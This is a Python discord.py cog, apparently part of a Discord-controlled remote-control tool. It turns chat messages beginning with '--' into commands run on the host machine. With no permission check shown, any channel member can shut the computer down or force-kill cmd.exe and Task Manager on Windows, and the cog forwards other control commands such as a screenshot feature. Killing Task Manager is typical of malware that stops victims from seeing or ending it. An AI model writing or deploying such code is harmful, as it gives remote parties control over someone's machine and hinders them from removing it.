import re
import os
import sys
import subprocess
import inspect
import discord
from discord.ext import commands

class FakeResponse:
    def __init__(self, msgObj: discord.Message):
        self.msgObj = msgObj

    async def send_message(self, content=None, *, ephemeral=False, **kwargs):
        await self.msgObj.channel.send(content=content, **kwargs)

    async def defer(self, *, thinking=False):
        pass

class FakeFollowup:
    def __init__(self, msgObj: discord.Message):
        self.msgObj = msgObj

    async def send(self, **kwargs):
        await self.msgObj.channel.send(**kwargs)

class FakeInteraction:
    def __init__(self, msgObj: discord.Message):
        self.msgObj = msgObj
        self.response = FakeResponse(msgObj)
        self.followup = FakeFollowup(msgObj)
        self.user = msgObj.author
        self.guild = msgObj.guild
        self.channel = msgObj.channel
        self.client = msgObj._state._get_client()

class EventCog(commands.Cog):
    def __init__(self, botObj: commands.Bot):
        self.bot = botObj

    @commands.Cog.listener(name="on_message")
    async def onMessage(self, msgObj: discord.Message):
        if msgObj.author.bot:
            return

        contentStr = msgObj.content
        if contentStr and contentStr.strip().startswith("--"):
            try:
                controlCogObj = self.bot.get_cog("ControlCog")
                cmdDict = {}
                if controlCogObj:
                    cogCmds = getattr(controlCogObj, "get_app_commands", None)
                    if callable(cogCmds):
                        cmdDict = {cmdObj.name: cmdObj for cmdObj in cogCmds()}
                    elif hasattr(controlCogObj, "__cog_app_commands__"):
                        cmdDict = {cmdObj.name: cmdObj for cmdObj in controlCogObj.__cog_app_commands__}

                for segStr in [s.strip() for s in contentStr.strip().split("--") if s.strip()]:
                    matchObj = re.match(r"^(\w+)(?:\((.*?)\))?$", segStr)
                    if not matchObj:
                        continue

                    cmdName = matchObj.group(1).lower()
                    paramStr = matchObj.group(2)
                    paramsDict = {}
                    if paramStr:
                        for p in paramStr.split(","):
                            if "=" in p:
                                k, v = p.split("=", 1)
                                paramsDict[k.strip()] = v.strip()

                    if cmdName in cmdDict:
                        targetCmd = cmdDict[cmdName]
                        sigObj = inspect.signature(targetCmd.callback)
                        kwargsDict = {}

                        for paramName, paramVal in paramsDict.items():
                            if paramName in sigObj.parameters:
                                annoType = sigObj.parameters[paramName].annotation
                                if annoType is float:
                                    kwargsDict[paramName] = float(paramVal)
                                elif annoType is int:
                                    kwargsDict[paramName] = int(paramVal)
                                else:
                                    kwargsDict[paramName] = paramVal

                        if cmdName == "screenshot_notify" and msgObj.attachments:
                            kwargsDict["image"] = msgObj.attachments[0]

                        fakeInterObj = FakeInteraction(msgObj)
                        await targetCmd.callback(controlCogObj, fakeInterObj, **kwargsDict)

                    elif cmdName == "shutdown":
                        await msgObj.channel.send("關機中...")
                        if sys.platform == "win32":
                            os.system("shutdown /s /f /t 0")
                        else:
                            os.system("shutdown -h now")

                    elif cmdName == "kill":
                        if sys.platform == "win32":
                            for procName in ["cmd.exe", "taskmgr.exe"]:
                                subprocess.run(["taskkill", "/F", "/IM", procName], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                            await msgObj.channel.send("已強制終止命令提示字元與工作管理員。")
                        else:
                            await msgObj.channel.send("此指令僅支援 Windows 系統。")

            except Exception as errObj:
                await msgObj.channel.send(f"執行失敗：{errObj}")
            return

        await self.bot.process_commands(msgObj)

async def setup(botObj: commands.Bot):
    await botObj.add_cog(EventCog(botObj))
